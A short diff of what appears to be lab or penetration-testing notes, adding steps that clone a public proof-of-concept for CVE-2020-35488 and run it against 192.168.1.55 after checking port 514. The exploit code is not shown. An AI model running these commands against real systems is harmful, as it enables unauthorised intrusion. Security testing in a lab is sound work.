@@ -32,5 +32,6 @@ lsof -i :514
 
 git clone https://github.com/GuillaumePetit84/CVE-2020-35488.git
 ls -lai
+cd CVE-*
 
-# ./PoC.py -ip 192.168.1.55 -os 3
+./PoC.py -ip 192.168.1.55 -os 3
